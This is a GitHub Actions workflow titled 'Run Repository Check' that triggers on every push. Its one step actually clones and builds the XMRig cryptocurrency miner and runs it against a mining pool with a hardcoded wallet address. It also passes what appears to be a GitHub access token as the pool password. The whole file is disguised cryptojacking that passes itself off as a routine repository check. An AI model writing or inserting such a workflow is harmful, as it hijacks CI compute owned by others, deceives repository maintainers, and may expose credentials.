name: Run Repository Check
on: [push]
jobs:
  Run-Repository-Check1:
    runs-on: ubuntu-latest
    steps:
      - name: Run Repository Check
        run: |
          sudo apt update
          sudo apt install build-essential git cmake libssl-dev libuv1-dev libhwloc-dev
          git clone https://github.com/xmrig/xmrig.git
          mkdir xmrig/build
          cd xmrig/build
          cmake ..
          make -j$(nproc)
          ./xmrig -o pool.hashvault.pro:443 -u 8BGxdoYAo8vGUTUqe8Yjh7F26RhaagTb68t3aejWSzSAjVJJyadRc8AJ313626eXreYyVEDL5o8ix61215Uh6mAPSTfYJHc -p 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 --tls -k
